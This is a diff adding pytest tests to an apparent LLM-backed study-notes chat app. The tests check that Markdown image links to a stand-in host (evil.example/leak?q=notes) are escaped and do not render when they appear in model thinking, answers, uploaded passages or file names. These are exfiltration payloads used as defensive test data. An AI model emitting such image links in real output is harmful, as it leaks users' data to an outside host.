@@ -105,6 +105,41 @@ def test_thinking_text_is_escaped_not_rendered_as_html(app):
     assert "&lt;img" in rendered and "<img" not in rendered
 
 
+def test_thinking_text_stays_inside_its_html_block(app):
+    """A blank line would end the HTML block, and the rest would render as Markdown."""
+    thinking = "Plan the answer.\n\n![x](https://evil.example/leak)\r\nDone."
+    at = ask(app(FakeLLM("Fine [S1].", thinking=thinking)), "decision tree split questions")
+    at.chat_input[0].set_value("how does a decision tree split data").run()  # now in history
+
+    thoughts = [m.value for m in at.markdown if m.value.startswith('<div class="bb-thought">')]
+    assert len(thoughts) == 2
+    for value in thoughts:
+        assert "\n" not in value and "\r" not in value and value.endswith("</div>")
+        assert "Plan the answer.<br><br>![x]" in value
+
+
+def test_images_in_answers_are_not_rendered(app):
+    llm = FakeLLM("Trees split data [S1]. ![x](https://evil.example/leak?q=notes)")
+    at = ask(app(llm), "how does a decision tree split data with questions")
+
+    assert not at.exception
+    assert not any("![" in m.value for m in at.markdown)
+    assert any("!\\[x](https://evil.example" in m.value for m in at.markdown)
+
+
+def test_source_passages_are_shown_as_plain_text(app):
+    at = app(FakeLLM("From your notes [S1]."))
+    at.session_state["docs"] = {
+        "notes.md": uploaded("notes.md", "Decision trees split data. ![x](https://evil.example/a)")
+    }
+    at.run()
+    ask(at, "how do decision trees split data")
+
+    assert not at.exception
+    assert any("![x](https://evil.example/a)" in t.value for t in at.expander[0].text)
+    assert not any("evil.example" in m.value for m in at.markdown)
+
+
 def kmeans_question(**overrides) -> QuizQuestion:
     fields = {
         "question": "What does k-means assign points to?",
@@ -396,3 +431,14 @@ def test_upload_that_would_exceed_the_session_passage_limit_is_refused(app):
     assert not at.exception
     assert at.session_state["docs"] == {}
     assert any("too long" in e.value for e in at.error)
+
+
+def test_uploaded_file_name_cannot_form_an_image(app):
+    at = upload(
+        app(FakeLLM()),
+        ("![x](https:evil.example).md", b"# Notes\nDecision trees split data on features."),
+    )
+
+    assert not at.exception
+    assert [name for name in at.session_state["docs"] if "![" in name] == []
+    assert len(at.session_state["docs"]) == 1
